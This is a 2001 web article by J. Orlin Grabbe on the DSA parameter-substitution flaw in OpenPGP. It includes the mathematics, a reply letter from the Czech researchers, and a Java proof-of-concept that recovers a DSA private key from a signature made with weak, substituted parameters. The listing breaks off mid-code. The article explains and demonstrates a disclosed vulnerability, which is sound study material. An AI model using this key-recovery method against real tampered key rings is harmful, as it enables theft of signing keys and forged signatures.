@@ -1,0 +1,1119 @@
+<html>
+<head>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<title>The DSA Flaw in OpenPGP, by J. Orlin Grabbe</title>
+</head>
+<body bgcolor="white" link="#0000ff" vlink="#800080">
+<p>
+<h2 align=center>The DSA Flaw in OpenPGP</h2>
+<h3 align=center><i>by J. Orlin Grabbe</i></h3>
+<center><table border=0 width=60%><tr><td>
+<p align="justify">
+This article is about something basic, not something esoteric.  Recently a problem was 
+found in Open PGP, relating to both the Digital Signature Algorithm (DSA) and to RSA.  
+You don't have to care about OpenPGP to care about this problem, because the problem 
+is much more basic to cryptography and your privacy.
+<p align="justify">
+This article explains the flaw, and gives you a Java cryptanalysis program so you can see 
+and exploit it for yourself.  Having actual code and program sample output is especially 
+important as some may have problems following the mathematics of the exploit.
+<p align="justify">
+The security of many things in cryptography, including, for example, digital cash, is 
+related to the "discrete logarithm problem".  This is a "hard" problem, and computer 
+security and financial security are sometimes based on the fact no one has found an easy 
+way to find discrete logarithms. But the forces of tyranny are not always stupid.  They 
+prefer to substitute easy problems for hard problems.
+<p align="justify">
+In a recent article </font>
+(<a href="http://zolatimes.com/V5.12/DMT_simple.html">http://zolatimes.com/V5.12/DMT_simple.html</a>) 
+I pointed out that the 
+FBI got a court order to install a keystroke logger on Nicky Scarfo, Jrs' computer because 
+they couldn't break Scarfo's PGP-encrypted files.  It was easier to steal Scarfo's 
+passphrase than to break his encryption.
+<p align="justify">
+Now two Czech mathematicians have shown an easy way to tamper with DSA signatures 
+by tampering with the parameters used in the signature.  The details will be reviewed 
+later but DSA signatures use three parameters <b>p, g, q</b> along with a public key <b>y</b> and a 
+private key <b>x</b>.  The method substitutes a faux <b>p'</b> and <b>g'</b> for the 
+original <b>p</b> and <b>g</b> (see 
+Vlastimil Klima and Tomas Rosa, "Attack on Private Signature Keys of the OpenPGP 
+format, PGP programs and other applications compatible with OpenPGP".  A copy of this 
+paper in .pdf format can be found 
+<a href="http://www.i.cz/en/pdf/openPGP_attack_ENGvktr.pdf">here</a>.)
+<p align="justify">
+Substituting the faux <b>p'</b> and <b>g'</b> is easy in the current OpenPGP format because there is no 
+check on the validity of the parameters. So if you have a hex editor and access to a 
+person's secret key ring, this part is trivial.  After that, all you have to do is get the person 
+to sign something and grab that, and then you can back out the person's private key <b>x</b>.  
+This is possible, because with the faux parameters the discrete logarithm problem is no 
+longer hard.  (But you still have to do the calculations; that's why I'm writing this article.)
+<p align="justify">
+The lesson is simple:  if you have access to DSA parameters and can alter them, and then 
+obtain a message signed with the faux parameters, you can steal a person's private key.  
+This has implications beyond PGP or the US government's Digital Signature Algorithm, 
+because DSA-type mathematics appears in many other contexts.
+<p align="justify">
+<h4 align="center">A Brief Review of DSA</h4>
+<p align="justify">
+The Java program below illustrates DSA using the Cryptix cryptography library (chiefly 
+the DSA signature function).  Now, technically, the exploit won't work with the Cryptix 
+DSA signature function, because Cryptix <i>does</i> verify the parameters, at least to a certain 
+extent.  So I show how to calculate the same signature outside the Cryptix DSA signature 
+function.  The point of all this is to give a known and unambiguous context for doing the 
+proper calculations, before we start with the faux parameters and faux signatures and the 
+theft of secret keys.  
+<p align="justify">
+Those unfamiliar with the Cryptix library can review my Java encryption page 
+(<a href="http://orlingrabbe.com/javacrypt_index.htm">http://orlingrabbe.com/javacrypt_index.htm</a>).
+<p align="justify">
+Suppose you want to DSA-sign a message. You are given DSA parameters <b>g, p, q</b>.  You 
+take a hash <b>h</b> of the message.  Then you produce two numbers (<b>r</b> and <b>s</b>) that are the 
+signature.  
+<p>
+First, produce a random number <b>k</b>, 0<<b>k</b><<b>q</b>, and calculate:
+<p>
+<b>r =  (g<sup>k</sup> mod p) mod q.</b>
+<p>
+Now calculate the inverse of <b>k</b>: 
+<p>
+<b>kInv = k<sup>-1</sup> mod q</b>.  (This is the number such that k*kInv = 1 mod q.)
+<p>
+Next, produce the number <b>s</b>, using the hash <b>h</b> and your secret key <b>x</b>:
+<p>
+<b>s = [kInv * (h + x*r) ] mod q</b>.
+<p align="justify">
+The two numbers (<b>r,s</b>) are the signature.  To verify the signature, you start with the 
+received message and the signature (<b>r,s</b>).  You take the hash <b>h'</b> of the received message, 
+then go through a series of calculations that begin with <b>s</b>.  If the end result is <b>r</b>, the 
+signature verifies.  If the end result is some number other than <b>r</b>, the signature is not valid.
+<p align="justify">
+The default parameters <b>g, p, q,</b> for Cryptix and the Sun Java libraries are (for 1024-bit 
+encryption, and written in hexadecimal notation):
+</td></tr></table></center>
+<center><table border=0 width=60%><tr><td>
+<p>
+<b>g = </b>
+<p>
+<font size="2" face="Courier">
+F7E1A085D69B3DDE CBBCAB5C36B857B9 7994AFBBFA3AEA82 F9574C0B3D078267 <br>
+5159578EBAD4594F E67107108180B449 167123E84C281613 B7CF09328CC8A6E1 <br>
+3C167A8B547C8D28 E0A3AE1E2BB3A675 916EA37F0BFA2135 62F1FB627A01243B <br>
+CCA4F1BEA8519089 A883DFE15AE59F06 928B665E807B5525 64014C3BFECF492A </font>
+<p>
+<b>p =</b> 
+<p>
+<font size="2" face="Courier">
+FD7F53811D751229 52DF4A9C2EECE4E7 F611B7523CEF4400 C31E3F80B6512669 <br>
+455D402251FB593D 8D58FABFC5F5BA30 F6CB9B556CD7813B 801D346FF26660B7 <br>
+6B9950A5A49F9FE8 047B1022C24FBBA9 D7FEB7C61BF83B57 E7C6A8A6150F04FB <br>
+83F6D3C51EC30235 54135A169132F675 F3AE2B61D72AEFF2 2203199DD14801C7 </font>
+</td></tr></table></center>
+<p>
+<center><table border=0 width=60%><tr><td>
+<p>
+<b>q =</b> <font size="2" face="Courier">9760508F15230BCC B292B982A2EB840B F0581CF5</font>
+<p>
+Here g and p have 1024 bits, while q has 160 bits.  They fulfill the requirement that
+<p>
+<b>g<sup>q</sup> = 1 mod p</b>,
+<p align="justify">
+and no lower power of  <b>g</b> equals 1 mod p.  (That is, <b>g</b> is a "generator" and 
+<b>q</b> is the "order" of g with respect to p.)  Necessarily, also, 
+<p align="justify">
+<b>p = 1 mod q</b>.
+<p align="justify">
+The faux parameters the Czech mathematicians substitute for <i>g</i> and <i>p</i> are these:
+<p align="justify">
+<b>g'</b> = <font size="2" face="Courier">31AC85291FF814E6 25E4B88C8C5047A7 DB2F0E45</font>
+<p align="justify">
+<b>p'</b> = <font size="2" face="Courier">5380000000000000 0000000000000000 00000001</font>
+<p align="justify">
+Here <b>p'</b> has 159 bits, while <b>g'</b> has 158 bits.  
+</td></tr></table></center>
+<center><table border=0 width=60%><tr><td>
+<p align="justify">
+Now, the reason this substitution won't work in the Cryptix DSA signature function is 
+that the function checks to see if  the number of bits in <b>p</b> is at least 512.  So it won't 
+accept <b>p'</b>.  So in the program I calculate the signatures and verification independently, to 
+get around this restriction, but only after demonstrating that these signing and verification 
+procedures duplicate those in Cryptix.  
+<p align="justify">
+Also, the DSA signature produced with  <b>g', p'</b>&#151;denote it (<b>r',s'</b>)&#151;is 
+not a valid signature.  That is, taking a hash of the (unaltered) message, and then starting with <b>s'</b> 
+and doing the correct calculations will not give you back <b>r'</b>.  But this is not important, because 
+the only reason for the false signature is to steal the secret key--and not to masquerade as a 
+valid signature.
+<p align="justify">
+<h4 align="center">How to Steal the Secret Key</h4>
+<p align="justify">
+  The first thing to note about <b>p'</b> is the following:
+<p>
+<b>p' = t*2<sup>s</sup> + 1</b>,
+<p>
+where <b>t</b> = 167 and <b>s</b> = 151.  Now, go back and review the DSA signature procedure.  You 
+first start with a random <b>k</b>, 0 <<b> k</b> < <b>q</b>.  
+<p align="justify">
+The first significant thing about the form <b>p'</b> takes is that, since <b>s</b> = 151, you can back out 
+151 bits of  <b>k mod 2<sup>s</sup></b> by looking at quadratic residues.  Next, you need do not more than 
+167 calculations to determine the value of <b>k mod t</b>.  (Well, that's approximately true.  
+You don't actually determine a single <b>k</b>, but rather one of 4 possible <b>k</b>'s.)
+<p align="justify">
+Then, using the Chinese Remainder Theorem,   you can determine <b>k</b> from <b>k mod 2s</b> and 
+<b>k mod t</b>.  
+<p>
+The other three k's are determined as <b>k</b>+(<b>p'</b>-1), <b>k</b>+2*(<b>p'</b>-1), <b>k</b>+3*(<b>p'</b>-1).
+<p align="justify">
+Once you've determined k, you just reverse the DSA signature mathematics and solve for 
+<b>x</b> (one of four possible x's).  The correct x, of course, is the one that gives the known 
+public key <b>y = g<sup>x</sup> mod p</b>.
+<p>
+In the sample computer output below, the 151 binary bits of <b>k</b> are shown as:
+<p>
+<b>k mod 2<sup>s</sup></b> =
+ <p>
+<font size="2" face="Courier">
+10101010000100000110001110010010111000001100100100010001100110101100010<br>
+10011110101000100111001000010000100100010011101001010111110011000111000<br>
+001101111 </font>
+<p>
+which translates into hexadecimal as:
+<p>
+<b>k mod 2<sup>s</sup></b> = 550831C9706488CD 629EA27210913A57 CC706F
+<p>
+Then after 62 calculations, we find the value of
+<p>
+<b>k mod t</b> = 62.
+<p>
+The Chinese Remainder Theorem then gives us for the value of <b>k</b>:
+<p>
+<b>k</b> = 0DD50831C9706488 CD629EA27210913A 57CC706F.
+<p align="justify">
+However, calculating x and then y from this value of k does not yield the right public 
+key.
+<p>
+So next we try <b>k</b>+(<b>p'</b>-1):
+<p>
+<b>k</b>+(<b>p'</b>-1) = 61550831C9706488 CD629EA27210913A 57CC706F,
+<p>
+which yields the correct value for the private key <b>x:</b>
+<p>
+<b>x </b>= 805C2D4BF743063C ABF060AD48E04BD6 813DA8B6.
+<p align="justify">
+<h4 align="center">Beware [?] of Figure 3</h4>
+<p align="justify">
+The tricky part of the calculation is in determining <b>k mod 2<sup>s</sup></b>; namely, the 151 bits, bit by 
+bit.  This is the only part of the attack for which Klima and Rosa provide pseudocode.  
+However, their pseudocode (in Figure 3 in their Appendix) is erroneous (perhaps 
+deliberately so).<u>[Note added:  Perhaps the error is mine: see the letter from Tomas
+Rosa and Vlastimil Klima following this article and preceding the Java source code.
+In any case . . .]</u>  The proper calculations are given in the code in my program below, 
+namely the lines:
+</td></tr></table></center>
+<center><table border=0 width=60%><tr><td>
+<p>
+<pre>
+// now set up routine to get the bits of k by looking at quadratic residues
+		p = pprime;
+		g = gprime;
+		BigInteger val, ival, TwoPower, PminusOne;
+		TwoPower = One;
+        	v = p.subtract(One);
+		Bv = Zero;
+		PminusOne = p.subtract(One);
+			
+		for(i=1;i<=151;i++) {
+			v = v.divide(Two); 
+			yk = r.modPow(v,p);
+			if(yk.compareTo(One)==0) wk[i]= 0;
+				else wk[i]=1;
+			Ij = new Integer(wk[i]);
+			w = Ij.toString();
+			Bj = new BigInteger(w);
+			Bj = Bj.multiply(TwoPower);
+			Bv = Bv.add(Bj);
+			Ba = PminusOne.subtract(Bv);
+			f = g.modPow(Ba,p);
+			r=Bfirst.multiply(f);
+			r=r.mod(p); 
+			TwoPower = TwoPower.multiply(Two);
+						}	
+		
+	      for(i=151;i>=1;i--) output.print(wk[i]);
+</pre>
+</td></tr></table></center>
+<center><table border=0 width=60%><tr><td>
+<p align="justify">
+<h4 align="center">General Comments on the Program</h4>
+<p align="justify">
+Each time the Java program is run, it uses the same parameters <b>p, g, q</b>, but produces a 
+different private key <b>x</b> and public key <b>y</b>.  Both the private key <b>x</b> and the public key <b>y</b> are 
+printed out for reference.  (This is the same "unknown" private key which the program 
+finds later through the faux signature.)
+<p align="justify">
+The program reads in a file called <b>data</b>, does a SHA1 hash of the file, and signs this hash,
+producing the signature (<b>r,s</b>).  Later on,  the program uses the faux <b>p', g'</b> to sign this hash 
+value again.  That is, the "message" that is captured after the faux parameters are 
+substituted is just the same hash value as before, but this time signed with the faux 
+parameters to produce the faux signature (<b>r', s'</b>).  
+<p>
+The SHA1 hash of the sample file <b>data</b> is
+<p>
+<b>h</b> = 1A01B56EB33FA84A 39EEDDD927977726 38331E94.
+<p align="justify">
+This is the hash value under Windows, which includes an end-of-file marker.  (For a 
+listing of the bytes being hashed, see my "Digital Signatures Illustrated" 
+(<a href="http://orlingrabbe.com/digsig.htm">http://orlingrabbe.com/digsig.htm</a>).  
+A Linux file will hash differently.
+<p>
+The program generates its own random bytes for the DSA signature, including the faux 
+signature, which in the sample given are
+<p>
+61550831C9706488 CD629EA27210913A 57CC706F
+<p align="justify">
+This is the second of the four possible values for <b>k</b> later backed out in the cryptanalysis section.  
+Since the associated calculated value for <b>x</b> gives the correct public key <b>y</b>, the program 
+stops, after printing out the real value of <b>x</b> (created in the early part of the program) for 
+comparison.
+<p align="justify">
+<h4 align="center">Comment on Java and Cryptix Versions</h4>
+<p align="justify">
+The program compiles and runs without errors.  I am using Cryptix 3.1 and running Java 
+1.2.2.  Most of the programs on my Java crypto page were written under Java 1.1.7b, but 
+basically run under Java 1.2.2 with no changes, provided you run the programs with 
+<b>oldjava.exe</b>. (Otherwise, in some cases, there are conflicts with the 
+java.security.interfaces module, or something similar.)
+<p align="justify">
+That is, to compile and run testDES.java under Java 1.2.2 you would enter the 
+commands:
+<p>
+javac testDES.java<br>
+oldjava testDES
+<p align="justify">
+The current program <b>pgp_dsa_flaw.java</b>, however, was written under Java 1.2.2 and 
+compiles and runs in the normal fashion:
+<p>
+javac pgp_dsa_flaw.java<br>
+java pgp_dsa_flaw <b>data</b>
+<p>
+where <b>data</b> is the name of the input file to be signed.
+<p>
+A text copy of the file <b>data</b> may be found <a href="data">here</a>.  A text file of the java program (listed below
+on this html page)  may be found <a href="pgp_dsa_flaw.java">here</a>.  Sample <a href="Flaw.out">output</a> is given after these listings.  
+</td></tr></table></center>
+<hr>
+<p>
+<h2 align=center>Czech Mathematicians Respond</h2>
+<center><table border=0 width=60%><tr><td>
+<p>
+<pre>
+Subject: RE: Java cryptanalysis program: the DSA flaw in OpenPGP
+From: Rosa Tomas <t.rosa@decros.cz>
+Date: Thu, 12 Apr 2001 10:49:35 +0200
+To: "'coderpunks@toad.com'" <coderpunks@toad.com>
+CC: "'orlingrabbe'" <orlingrabbe@orlingrabbe.com>
+<p>
+Dear Mr. Grabbe,
+thank you for your interest in our work. Your comment and program are both
+excellent.
+<p>
+What we would like to ask about is your warning about error(s) in our paper
+in Figure 3. We have checked our algorithm once again and we didn't find any
+bug there. Moreover our technician have written program used to test our
+attack just in the way according to the Figure 3. And it worked.
+<p>
+One and only thing, that could be misleading is at the line 4. Note that the
+command r = r*f mod p belongs only to the else-part of the if-then-else
+statement. 
+The line 4 at our Figure 3 is 
+if (y=1) then wi=0 else wi=1; r=r*f mod p 
+Because it is pseudocode and it is on one line it is read as if (y=1) then
+wi=0 else {wi=1; r=r*f mod p}. It is explained in our article, too.
+You wrote the loop for(i=1;i<=151;i++) correctly without our condition
+if-then-else and in fact you do r=r*f every time. But in the case wi=0 it
+holds in your program that f=1, thus r=r*f is not necessary to compute.
+<p>
+We would very appreciate some other comments on our algorithm. And we are
+pleased that you implemented it and acknowledged it independently. Thank you
+very much for your work.
+<p>
+Note, that we did not publish the implementation of the algorithm, to give
+NAI the time to release the patch.
+<p>
+According to the page 4 of your web paper we also note that we will release
+the updated version of our paper soon. There will be included slight
+modification of the attack on DSA, which allows us to use the p' in proper
+length (eg. 512-1024 bits; from the mathematical point of view this
+modification is not very hard, but practically it seems to be useful).
+<p>
+with the best regards
+Tomas Rosa and Vlastimil Klima
+<p>
+-----Original Message-----
+From: orlingrabbe [mailto:orlingrabbe@orlingrabbe.com]
+Sent: Wednesday, April 11, 2001 2:08 AM
+To: coderpunks@toad.com 
+Subject: Java cryptanalysis program: the DSA flaw in OpenPGP
+<p>
+I have written a Java cryptanalysis program and article
+for the Laissez Faire City Times regarding the recently
+announced DSA flaw in OpenPGP.  The program does the 
+calculations to back out the (secret) private key.
+<p>
+An advance copy of the article and program is available
+at
+<p>
+http://orlingrabbe.org/lfctimes/DSAflaw_OpenPGP.htm  
+<p>
+Cheers,
+<p>
+Orlin
+</pre>
+</td></tr></table></center>
+<hr>
+<h4 align="center">pgp_dsa_flaw.java</h4>
+<p>
+<pre>
+import java.io.*;
+import java.lang.*;
+import java.security.*;
+import java.security.interfaces.*;
+import java.math.*;
+import cryptix.util.core.BI;
+import cryptix.util.core.Hex;
+import cryptix.provider.key.*;
+import cryptix.provider.md.*;
+
+class pgp_dsa_flaw {
+
+    public static void main(String[] args) {
+
+	try {
+		BigInteger p, q, g, y, x, r, s, kk, z;
+		BigInteger pprime, gprime, pstore, gstore;
+		String w;
+
+		FileOutputStream outFile = new FileOutputStream("Flaw.out");
+		          PrintStream output = new PrintStream(outFile);
+
+		g = new 
+BigInteger("f7e1a085d69b3ddecbbcab5c36b857b97994afbbfa3aea82f9574c0b3d0782675159578ebad45
+94fe67107108180b449167123e84c281613b7cf09328cc8a6e13c167a8b547c8d28e0a3ae1e2bb3a675916ea3
+7f0bfa213562f1fb627a01243bcca4f1bea8519089a883dfe15ae59f06928b665e807b552564014c3bfecf492
+a",16);
+		w = cryptix.util.core.BI.dumpString(g);
+		output.println("g = " + w);
+		gstore = g;
+
+		q = new BigInteger("9760508f15230bccb292b982a2eb840bf0581cf5", 16);
+		w = cryptix.util.core.BI.dumpString(q);
+		output.println("q = " + w);
+
+		p = new 
+BigInteger("fd7f53811d75122952df4a9c2eece4e7f611b7523cef4400c31e3f80b6512669455d402251fb5
+93d8d58fabfc5f5ba30f6cb9b556cd7813b801d346ff26660b76b9950a5a49f9fe8047b1022c24fbba9d7feb7
+c61bf83b57e7c6a8a6150f04fb83f6d3c51ec3023554135a169132f675f3ae2b61d72aeff22203199dd14801c
+7",16);
+		w = cryptix.util.core.BI.dumpString(p);
+		output.println("p = " + w);
+		pstore = p;
+
+		pprime = new BigInteger("5380000000000000000000000000000000000001",16);                 
+		w = cryptix.util.core.BI.dumpString(pprime);
+		output.println("pprime = " + w);
+
+		gprime = new BigInteger("31ac85291ff814e625e4b88c8c5047a7db2f0e45",16);                 
+		w = cryptix.util.core.BI.dumpString(gprime);
+		output.println("gprime = " + w);
+
+		//calculate random k
+		SecureRandom ran = new SecureRandom();
+		byte[] bb = new byte[20];
+		ran.nextBytes(bb);
+
+		w = cryptix.util.core.Hex.dumpString(bb);
+		output.println("20 random bytes: " + w);
+
+		//read in a file and calculate the message digest (hash)
+	  	MessageDigest md = MessageDigest.getInstance("SHA-1");
+        	FileInputStream fis = new FileInputStream(args[0]);
+		byte b;
+        	while (fis.available() != 0) {
+        		b = (byte) fis.read();
+        		md.update(b);
+               		};
+        	fis.close();
+
+		byte[] hash = md.digest();
+		w = cryptix.util.core.Hex.dumpString(hash);
+		output.println("\n");
+		output.println("the SHA-1 hash of " + args[0] + " is " + w);
+
+            // generate a DSA key pair
+            KeyPairGenerator keyGen = KeyPairGenerator.getInstance("DSA");
+
+ 		keyGen.initialize(1024, ran);
+            KeyPair pair = keyGen.generateKeyPair();
+	
+            // create a DSA Signature object
+            Signature dsa = Signature.getInstance("SHA/DSA"); 
+
+		// cast as DSAKey in order to access g, p, q directly
+		DSAKey priv2 = (DSAKey) pair.getPrivate();
+		DSAParams params = priv2.getParams();
+		g = (BigInteger) params.getG();
+		w = cryptix.util.core.BI.dumpString(g);
+		output.println("generator g = " + w);
+		p = (BigInteger) params.getP();
+		w = cryptix.util.core.BI.dumpString(p);
+		output.println("prime p = " + w);
+		q = (BigInteger) params.getQ();
+		w = cryptix.util.core.BI.dumpString(q);
+		output.println("order q of group G(q) = " + w);
+		
+		// check that the parameters are valid: does p mod q = 1?
+		z = p.mod(q);
+		w = cryptix.util.core.BI.dumpString(z);
+ 		output.println("p mod q = " + w);
+		
+		// check that the parameters are valid: does g^q mod p = 1?
+		z = g.modPow(q,p);
+		w = cryptix.util.core.BI.dumpString(z);
+ 		output.println("g^q mod p = " + w);
+
+		// cast as DSAPrivateKey in order to access the private key x directly
+            DSAPrivateKey priv = (DSAPrivateKey) pair.getPrivate();
+		x = (BigInteger) priv.getX();
+		String sx = cryptix.util.core.BI.dumpString(x);
+		output.println(" ");
+		output.println("private key x = " + sx);
+
+            // cast as DSAPublicKey in order to access  the public key y directly 
+            DSAPublicKey pub = (DSAPublicKey) pair.getPublic();
+		y = (BigInteger) pub.getY();
+		String sy = cryptix.util.core.BI.dumpString(y);
+		output.println(" ");
+		output.println("public key y = " + sy);
+
+		// check the validity of the public-private key relationship
+		z = g.modPow(x,p);
+		w = cryptix.util.core.BI.dumpString(z);
+		output.println(" ");
+		output.println("Note here that the value of ");
+ 		output.println("g^x mod p = " + w);
+		output.println("which verifies the public key y.");		
+
+         	// initialize the Signature object for signing 
+         	dsa.initSign(priv);
+
+         	//update and sign the data
+		//independently check the message digest
+	  	md = MessageDigest.getInstance("SHA-1");
+        	fis = new FileInputStream(args[0]);
+        	while (fis.available() != 0) {
+        		b = (byte) fis.read();
+        		md.update(b);
+        		dsa.update(b);
+               		};
+        	fis.close();
+
+		hash = md.digest();
+		w = cryptix.util.core.Hex.dumpString(hash);
+		output.println("the SHA-1 hash of " + args[0] + " is " + w);
+
+        	// now that all the data to be signed has been read in, sign it 
+		BigInteger sig1;
+        	byte[] sig = dsa.sign();
+		w = cryptix.util.core.Hex.dumpString(sig);
+		output.println("the DSA signature (byte array) is " + w);
+		sig1 = new BigInteger(sig);
+		w = cryptix.util.core.BI.dumpString(sig1);
+		output.println("the DSA signature (BigInteger) is " + w);
+
+        	// extract the first part of signature 
+		BigInteger Bfirst, Bsecond;
+	  	byte[] bf = new byte[20];
+	  	int i=0, j=0, k=0;
+
+		// check if bytes are 0214h or 0215h and adjust accordingly
+		// note that BigInteger from bytes must have positive sign
+		if(sig[3]==21) j=1;
+		if((j==0)&&(sig[25]==21)) k=1;
+		else if((j==1)&&(sig[26]==21)) k=1;
+		output.println(" j = " + j + " k = " + k);
+		output.println(" sig[3] = " + sig[3] + " sig[25] = " + sig[25] + " sig[26] 
+                    = " + sig[26]);
+	  	for(i=4+j;i<24+j;i++) bf[i-4-j] = sig[i];
+        	Bfirst = new BigInteger(bf);
+		if(j==1) {byte[] bg = new byte[21];
+				    bg[0] = 0;
+				    for(i=1;i<21;i++) bg[i]=bf[i-1];
+				    Bfirst = new BigInteger(bg);
+					}
+
+		r = Bfirst;
+		w = cryptix.util.core.BI.dumpString(r);
+        	output.println("The first number in signature = " + w);
+        	output.println(" ");
+
+        	// extract the second part of signature 
+	  	byte[] bs = new byte[20];
+	  	for(i=26+j+k;i<46+j+k;i++) bs[i-26-j-k] = sig[i];
+        	Bsecond = new BigInteger(bs);
+		if(k==1) {byte[] bt = new byte[21];
+				    bt[0] = 0;
+				    for(i=1;i<21;i++) bt[i]=bs[i-1];
+				    Bsecond = new BigInteger(bt);
+									}
+		s = Bsecond;
+       	w = cryptix.util.core.BI.dumpString(s);
+        	output.println("The second number in signature = " + w);
+        	output.println(" ");
+
+		// calculate the DSA signature (and compare)
+		// needed are the hash of the message, first and second
+		//   parts of signature, public key y, group generator g
+		BigInteger Bhash, Zero, Bfirinv, Bsecinv, Bu1, Bu2, Ba, Bb, Bt, Bv;
+		Zero = new BigInteger("0");
+		Bhash = new BigInteger(hash);
+
+		// note that verification starts with the second number in the signature, 
+        // does some calculations, and if the result is the first number, then 
+		// the verification is true
+		if(Bfirst.compareTo(Zero)==-1) output.println("verify = false");
+		else if (Bsecond.compareTo(Zero)==-1) output.println("verify = false");
+		else {
+			Bsecinv = Bsecond.modInverse(q);   
+			Bu1 = Bhash.multiply(Bsecinv);
+			Bu1 = Bu1.mod(q);
+			Bu2 = Bfirst.multiply(Bsecinv);
+			Bu2 = Bu2.mod(q);
+			Ba = g.modPow(Bu1,p);
+			Bb = y.modPow(Bu2,p);
+			Bt = Ba.multiply(Bb);
+			Bt = Bt.mod(p);
+			Bv = Bt.mod(q);
+			if (Bv.compareTo(Bfirst)==0) 
+			output.println("verify (independent calculation) = true");
+				else output.println("verify (ind calculation) = false");
+        		w = cryptix.util.core.BI.dumpString(Bv);
+        		output.println("verfication number is = " + w);
+        		output.println(" ");
+			}
+
+		// verify the signature using the verify function
+		// initialize the Signature object for verification 
+            dsa.initVerify(pub);
+
+            // update and verify the data
+            fis = new FileInputStream(args[0]);
+            while (fis.available() != 0) {
+                b = (byte) fis.read();
+                dsa.update(b);
+                };
+            fis.close();
+
+            boolean verifies = dsa.verify(sig);
+            output.println("signature verifies (verification function): " + verifies);
+		    output.println(" ");
+
+		// NOW we are ready to calculate the private key x from the signature, 
+		// substituting pprime for p and gprime for g
+
+		// first, sign something using the private (secret) key and the faux parameters
+		// (in this case we'll stick with the previously calculated hash)
+		// we do the signature twice, first with true parameters p, g (which will verify)
+		// and next with faux parameters pprime, gprime (which will not)
+
+		BigInteger One, Two, kinv;		
+		One = new BigInteger("1");
+		Two = new BigInteger("2");
+
+		ran = new SecureRandom();
+		ran.nextBytes(bb); //leave outside loop so same bytes used in each case
+		w = cryptix.util.core.Hex.dumpString(bb);
+		output.println("20 random bytes: " + w);
+	
+		kk = new BigInteger(bb);
+		kk = kk.mod(q);
+		w = cryptix.util.core.BI.dumpString(kk);
+		output.println("random bytes mod q: " + w);
+
+		for(i=0;i<2;i++) {
+
+		if(i==1) p = pprime;
+		if(i==1) g = gprime;
+		
+		r = g.modPow(kk,p);
+		r = r.mod(q);
+
+		Bfirst=r;
+		w = cryptix.util.core.BI.dumpString(r);
+        	output.println("The first number in (possibly faux) signature = " + w);
+        	output.println(" ");
+
+		kinv = kk.modInverse(q);
+		s = x.multiply(r);
+		s = s.add(Bhash);
+		s = s.multiply(kinv);
+		s = s.mod(q);
+
+		Bsecond=s;
+       	w = cryptix.util.core.BI.dumpString(s);
+        	output.println("The second number in (possibly faux) signature = " + w);
+        	output.println(" ");
+		
+		// verify that the signature works
+		if(Bfirst.compareTo(Zero)==-1) output.println("verify = false");
+		else if (Bsecond.compareTo(Zero)==-1) output.println("verify = false");
+		else {
+			Bsecinv = Bsecond.modInverse(q);   
+			Bu1 = Bhash.multiply(Bsecinv);
+			Bu1 = Bu1.mod(q);
+			Bu2 = Bfirst.multiply(Bsecinv);
+			Bu2 = Bu2.mod(q);
+			Ba = g.modPow(Bu1,p);
+			Bb = y.modPow(Bu2,p);
+			Bt = Ba.multiply(Bb);
+			Bt = Bt.mod(p);
+			Bv = Bt.mod(q);
+			if (Bv.compareTo(Bfirst)==0) 
+			output.println("verify (independent calculation) = true");
+				else output.println("verify (ind calculation) = false");
+        		w = cryptix.util.core.BI.dumpString(Bv);
+        		output.println("verfication number is = " + w);
+        		output.println(" ");
+			}
+					}
+
+		// now calculate the private key x from the faux signature (r,s)
+		// first verify the value of pprime
+		int sk=151;
+		Integer Ij;
+		BigInteger Btk = new BigInteger("167");
+		int[] wk = new int[152];
+		BigInteger f, v, yk, Hack, Bj;
+		Hack = Two.pow(sk);
+		Hack = Hack.multiply(Btk);
+		Hack = Hack.add(One);
+        	w = cryptix.util.core.BI.dumpString(Hack);
+        	output.println("pprime (calculated) is = " + w);
+
+		// now set up routine to get the bits of k by looking at quadratic residues
+		p = pprime;
+		g = gprime;
+		BigInteger val, ival, TwoPower, PminusOne;
+		TwoPower = One;
+        	v = p.subtract(One);
+		Bv = Zero;
+		PminusOne = p.subtract(One);
+			
+		for(i=1;i<=151;i++) {
+			//output.println("i = " + i);
+			v = v.divide(Two); 
+			//w = cryptix.util.core.BI.dumpString(v);
+        		//output.println("v is = " + w);			
+			yk = r.modPow(v,p);
+        		//w = cryptix.util.core.BI.dumpString(yk);
+        		//output.println("yk is = " + w);
+			if(yk.compareTo(One)==0) wk[i]= 0;
+				else wk[i]=1;
+			//output.println("wk["+i+"] = " + wk[i]);
+			Ij = new Integer(wk[i]);
+			w = Ij.toString();
+			Bj = new BigInteger(w);
+			Bj = Bj.multiply(TwoPower);
+			Bv = Bv.add(Bj);
+			Ba = PminusOne.subtract(Bv);
+        		//w = cryptix.util.core.BI.dumpString(Ba);
+        		//output.println(" q - w bits (so far) is = " + w);
+			f = g.modPow(Ba,p);
+        		//w = cryptix.util.core.BI.dumpString(f);
+        		//output.println("f is = " + w);
+			r=Bfirst.multiply(f);
+			r=r.mod(p); 
+			TwoPower = TwoPower.multiply(Two);
+			//w = cryptix.util.core.BI.dumpString(r);
+        		//output.println("r is = " + w);
+						}	
+		
+	      for(i=151;i>=1;i--) output.print(wk[i]);
+		  output.println(" ");
+
+		// calculate the value of w mod 2^s
+		TwoPower = Two;
+		if(wk[1]==1) val = One;
+			else   val = Zero;
+		for (i=2;i<=151;i++) {
+			if(wk[i]==1) ival = One;
+				else ival = Zero;
+			ival = ival.multiply(TwoPower);
+			TwoPower = TwoPower.multiply(Two);
+			val = val.add(ival);
+					}
+        	w = cryptix.util.core.BI.dumpString(val);
+        	output.println("***** w mod 2^s is = " + w);
+
+		r = Bfirst; //restore value of r, altered by loop
+
+		// now calculate value of w mod t = j
+		Hack = Two.pow(sk);
+		Bu1 = r.modPow(Hack,p);
+		Bu2 = g.modPow(Hack,p);
+		Bv = Bu2;
+        	w = cryptix.util.core.BI.dumpString(Bu1);
+        	output.println("r^((p-1)/t) is = " + w);
+        	w = cryptix.util.core.BI.dumpString(Bu2);
+        	output.println("g^((p-1)/t) is = " + w);
+
+		j = 1;
+		if(Bu1.compareTo(One)==0) j = 0;
+		else if(Bu1.compareTo(Bu2)==0) j = 1;
+			else {
+			while(Bu1.compareTo(Bu2)!=0) {
+			Bu2 = Bu2.multiply(Bv);
+			Bu2 = Bu2.mod(p);
+			j = j+1; 
+			//output.println("j = "+j);
+	        	//w = cryptix.util.core.BI.dumpString(Bu2);
+      	  	//output.println("g^((p-1)/t)*j) is = " + w);
+
+			if(j>166) break; }}
+
+		output.println("***** w mod t = " + j);
+        	w = cryptix.util.core.BI.dumpString(Bu1);
+        	output.println("r^((p-1)/t) is = " + w);
+        	w = cryptix.util.core.BI.dumpString(Bu2);
